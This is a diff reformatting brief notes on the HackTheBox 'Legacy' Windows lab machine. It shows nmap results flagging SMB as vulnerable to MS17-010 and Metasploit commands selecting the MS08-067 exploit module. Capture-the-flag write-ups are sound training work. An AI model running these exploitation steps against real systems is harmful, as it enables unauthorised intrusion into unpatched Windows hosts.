@@ -1,13 +1,15 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Legacy
-# 16/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.4
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT    STATE SERVICE      VERSION
 135/tcp open  msrpc        Microsoft Windows RPC
 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -17,9 +19,7 @@ PORT    STATE SERVICE      VERSION
 | smb-vuln-ms17-010: 
 |   VULNERABLE:
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 └─$ msfconsole  
 msf6 > search ms08-067
 use windows/smb/ms08_067_netapi
